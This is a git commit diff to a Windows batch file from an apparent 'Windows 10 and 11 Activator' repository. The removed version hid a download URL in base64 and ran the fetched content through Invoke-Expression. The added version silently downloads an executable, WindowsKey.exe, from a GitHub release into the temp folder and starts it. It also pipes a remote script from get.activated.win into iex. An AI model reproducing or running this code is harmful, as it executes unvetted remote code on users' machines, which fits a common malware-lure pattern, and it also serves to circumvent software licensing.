b47bb5e7404f9416385a6a1cb82a0c239ac6f30b
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 03:33:59 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,5 +1,9 @@
 @echo off
-set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
-for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-Expression (irm '%url%')"
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
+set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
+set "url2=https://get.activated.win"
+
+
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
+
+
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
